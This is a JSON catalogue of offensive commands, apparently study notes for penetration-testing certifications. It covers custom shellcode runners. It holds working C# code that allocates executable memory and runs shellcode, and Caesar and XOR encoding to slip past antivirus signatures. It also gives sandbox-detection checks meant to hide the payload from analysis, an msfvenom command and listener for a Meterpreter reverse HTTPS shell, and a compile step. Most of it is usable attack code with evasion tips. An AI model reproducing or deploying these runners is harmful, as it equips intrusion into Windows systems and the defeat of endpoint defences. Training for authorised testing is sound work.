{
  "category": "Shellcode Runners",
  "description": "Custom shellcode execution templates for C#, VBA, and PowerShell. Includes encryption methods to evade signature detection.",
  "commands": [
    {
      "id": "csharp-shellcode-runner-basic",
      "name": "C# Shellcode Runner (Basic)",
      "description": "Basic C# template for executing raw shellcode via VirtualAlloc → CreateThread → WaitForSingleObject pattern. Foundation for all custom runners.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "shellcode",
        "windows",
        "payload-delivery"
      ],
      "command": "using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner {\n    class Program {\n        [DllImport(\"kernel32\")]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n        \n        [DllImport(\"kernel32\")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        \n        [DllImport(\"kernel32\")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n        \n        static void Main(string[] args) {\n            byte[] buf = new byte[] { <SHELLCODE> };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}",
      "variables": [
        {
          "name": "<SHELLCODE>",
          "description": "Raw shellcode bytes in C# format (0xfc,0x48,0x83,...)",
          "example": "0xfc,0x48,0x83,0xe4,0xf0",
          "required": true
        }
      ],
      "notes": "Syntax: Save as Program.cs, compile with csc.exe Basic runner will be flagged by modern AV. Always add encryption (caesar/xor) or heuristic evasion before deploying. Practice compiling on Windows target. Time estimate: 2 minutes (with pre-generated shellcode) References: docs/av-evasion/shellcode-runners.md#basic-runner, PEN-300 Chapter 6.5.1 Manual alternative: Use Python ctypes, PowerShell reflection, or compiled languages (C/C++) for shellcode execution",
      "success_indicators": [
        "No console output. Shellcode executes (e.g., reverse shell connects, Meterpreter session opens)."
      ],
      "failure_indicators": [
        "Defender flags VirtualAlloc(PAGE_EXECUTE_READWRITE) - Add encryption or sandbox checks",
        "Compilation error - Ensure .NET 4.0+ framework installed",
        "Shellcode doesn't execute - Verify architecture match (x86 vs x64)",
        "Access denied - May need admin rights depending on payload"
      ]
    },
    {
      "id": "csharp-caesar-encrypt",
      "name": "C# Caesar Cipher Encryption",
      "description": "Encrypt shellcode with Caesar cipher (byte rotation). Simple obfuscation to evade static signatures. Decrypt at runtime before execution.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "encryption",
        "shellcode",
        "obfuscation"
      ],
      "command": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { <RAW_SHELLCODE> };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)(((uint)buf[i] + <KEY>) & 0xFF);\n}\n// Print encoded array\nConsole.WriteLine(\"byte[] encoded = new byte[] { \" + string.Join(\",\", encoded.Select(b => $\"0x{b:X2}\")) + \" };\");\n\n// DECRYPTION (runtime in runner)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)(((uint)buf[i] - <KEY>) & 0xFF);\n}",
      "variables": [
        {
          "name": "<RAW_SHELLCODE>",
          "description": "Original shellcode bytes from msfvenom",
          "example": "0xfc,0x48,0x83",
          "required": true
        },
        {
          "name": "<KEY>",
          "description": "Caesar cipher rotation key (1-255)",
          "example": "2",
          "required": true
        }
      ],
      "notes": "Syntax: Add encryption offline, add decryption to runner before VirtualAlloc Caesar cipher is weak but fast. Good for lab practice. For exam, use XOR or combine with heuristic evasion. Key=2 is common in examples. Time estimate: 5 minutes (encryption + integration) References: docs/av-evasion/shellcode-runners.md#caesar-cipher, PEN-300 Chapter 6.5.2 Manual alternative: Use XOR encryption (stronger), AES encryption (strongest), or custom encoding schemes",
      "success_indicators": [
        "Encrypted runner bypasses static signatures. Shellcode executes normally after runtime decryption."
      ],
      "failure_indicators": [
        "Wrong key - Shellcode corrupted, won't execute",
        "Encryption detected by heuristics - Add sleep timers or API checks",
        "Still flagged - Caesar too simple, use XOR or AES instead"
      ]
    },
    {
      "id": "csharp-xor-encrypt",
      "name": "C# XOR Encryption",
      "description": "XOR encryption for shellcode. Stronger than Caesar cipher. Each byte XORed with key, decrypt by XORing again (XOR is reversible).",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "encryption",
        "shellcode",
        "xor"
      ],
      "command": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { <RAW_SHELLCODE> };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);\n}\n\n// DECRYPTION (runtime - same operation)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);\n}",
      "variables": [
        {
          "name": "<RAW_SHELLCODE>",
          "description": "Original shellcode bytes",
          "example": "0xfc,0x48,0x83",
          "required": true
        },
        {
          "name": "<XOR_KEY>",
          "description": "XOR encryption key (0-255)",
          "example": "0xAA",
          "required": true
        }
      ],
      "notes": "Syntax: XOR encrypt offline, XOR decrypt at runtime (same key) XOR is standard industry practice. Key 0xAA common but predictable - use random key. Combine with heuristic evasion for best results. Time estimate: 5 minutes References: docs/av-evasion/shellcode-runners.md#xor-encryption Manual alternative: Use multi-byte XOR keys, AES encryption, or RC4 cipher for stronger protection",
      "success_indicators": [
        "XOR encrypted payload bypasses more signatures than Caesar. Decrypts and executes at runtime."
      ],
      "failure_indicators": [
        "Key mismatch - Shellcode corrupted",
        "XOR pattern detected - Use multi-byte key or AES",
        "Still flagged by heuristics - Add sleep timers"
      ]
    },
    {
      "id": "csharp-sleep-timer",
      "name": "C# Sleep Timer Evasion",
      "description": "Heuristic evasion using sleep timer with elapsed time validation. Sandboxes skip Sleep() calls - detect by measuring actual elapsed time.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "heuristic",
        "sandbox-detection",
        "sleep"
      ],
      "command": "using System;\nusing System.Threading;\n\nDateTime t1 = DateTime.Now;\nThread.Sleep(<SLEEP_MS>);\ndouble deltaT = DateTime.Now.Subtract(t1).TotalSeconds;\nif(deltaT < <THRESHOLD_SEC>) {\n    return; // Sandbox detected - exit\n}\n// Continue with payload execution",
      "variables": [
        {
          "name": "<SLEEP_MS>",
          "description": "Sleep duration in milliseconds",
          "example": "10000",
          "required": true
        },
        {
          "name": "<THRESHOLD_SEC>",
          "description": "Minimum expected elapsed time (slightly less than sleep duration to account for processing)",
          "example": "9.5",
          "required": true
        }
      ],
      "notes": "Syntax: Add before shellcode execution in Main() Simple but effective against basic sandboxes. 10 seconds is standard. For exam, may skip to save time if target already compromised. Good for phishing scenarios. Time estimate: 1 minute (add to existing runner) References: docs/av-evasion/shellcode-runners.md#sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative: Use non-emulated API checks (VirtualAllocExNuma), large memory allocations, or anti-debugging techniques",
      "success_indicators": [
        "In sandbox: Exits immediately (sandbox detected). On real system: Waits 10 seconds then executes payload."
      ],
      "failure_indicators": [
        "Advanced sandboxes may wait out sleep - Use longer delays or combine techniques",
        "User impatience - 10 seconds may alert user, consider shorter sleep",
        "False positive on slow systems - Adjust threshold downward"
      ]
    },
    {
      "id": "csharp-non-emulated-api",
      "name": "C# Non-Emulated API Check",
      "description": "Detect sandbox by calling VirtualAllocExNuma - rarely emulated API. If NULL returned, sandbox detected. Combines with GetCurrentProcess for legitimacy.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "heuristic",
        "sandbox-detection",
        "api-check"
      ],
      "command": "using System;\nusing System.Runtime.InteropServices;\n\n[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\nstatic extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr GetCurrentProcess();\n\n// Sandbox check\nIntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\nif(mem == null) {\n    return; // Sandbox detected - API not emulated\n}\n// Continue with payload",
      "variables": [],
      "notes": "Syntax: Add before shellcode execution in Main() More sophisticated than sleep timer. Bypasses sandboxes that wait out delays. Combine both for maximum evasion. Quick to add (<10 lines). Time estimate: 2 minutes References: docs/av-evasion/shellcode-runners.md#non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative: Use FlsAlloc, GetTickCount64, or other rarely-emulated APIs. Check for debugger with IsDebuggerPresent.",
      "success_indicators": [
        "In sandbox: Exits (NULL returned). On real system: Continues to payload execution."
      ],
      "failure_indicators": [
        "Advanced sandboxes may emulate VirtualAllocExNuma - Use multiple checks",
        "System doesn't support NUMA - Rare but possible, may fail on real systems",
        "Check comparison wrong - Use IntPtr.Zero not null"
      ]
    },
    {
      "id": "msfvenom-csharp-payload",
      "name": "Generate msfvenom C# Shellcode",
      "description": "Generate shellcode in C# byte array format for use in custom runners. Use HTTPS payloads for encrypted C2 communication.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "msfvenom",
        "shellcode",
        "payload-generation",
        "csharp"
      ],
      "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f csharp",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address (must be reachable from target)",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listener port (443 recommended for HTTPS traffic blending)",
          "example": "443",
          "required": true
        }
      ],
      "prerequisites": [
        "# Start listener\nmsfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT <LPORT>; run'"
      ],
      "notes": "Syntax: Run on Kali, copy output to C# runner Always use HTTPS payloads (not HTTP) for better evasion. Port 443 blends with legitimate traffic. Generate before exam, don't waste time during. Time estimate: 30 seconds References: docs/av-evasion/shellcode-runners.md#msfvenom-generation, PEN-300 Chapter 6.4 Manual alternative: Use custom reverse shell (bash, python, netcat) or C2 frameworks (Cobalt Strike, Sliver, Havoc)",
      "success_indicators": [
        "Shellcode byte array in C# format:\nbyte[] buf = new byte[xxx] { 0xfc,0x48,0x83,... };"
      ],
      "failure_indicators": [
        "Architecture mismatch - Ensure x64 payload for 64-bit target",
        "Port 443 blocked - Use alternate port and update listener",
        "LHOST not reachable - Verify network connectivity"
      ]
    },
    {
      "id": "compile-csharp-runner",
      "name": "Compile C# Shellcode Runner",
      "description": "Compile C# source code to Windows executable using csc.exe (.NET Framework compiler). Must be run on Windows target or staging system.",
      "category": "shellcode-runners",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "csharp",
        "compilation",
        "windows"
      ],
      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:<OUTPUT_EXE> <SOURCE_CS>",
      "variables": [
        {
          "name": "<OUTPUT_EXE>",
          "description": "Output executable name",
          "example": "runner.exe",
          "required": true
        },
        {
          "name": "<SOURCE_CS>",
          "description": "C# source file path",
          "example": "Program.cs",
          "required": true
        }
      ],
      "notes": "Syntax: Run on Windows system with .NET Framework Practice compiling on Windows VM before exam. Framework64 for modern systems. /target:winexe hides console window (stealthier). Compilation is fast (<5 seconds). Time estimate: 30 seconds References: docs/av-evasion/shellcode-runners.md#compilation Manual alternative: Use Visual Studio, MSBuild, or cross-compile with Mono on Linux",
      "success_indicators": [
        "runner.exe created in current directory. No output = success."
      ],
      "failure_indicators": [
        "csc.exe not found - .NET Framework not installed or wrong path",
        "Syntax errors - Check C# code for typos",
        "Permission denied - Write access required in output directory",
        "Wrong architecture - Use Framework64 for x64, Framework for x86"
      ]
    }
  ],
  "oscp_relevance": "Essential for custom payload delivery when msfvenom raw payloads are detected. Encryption and heuristic evasion required for modern AV bypass.",
  "attack_chain_position": "Initial Access, Post-Exploitation",
  "related_categories": [
    "payload-generation",
    "evasion",
    "windows"
  ]
}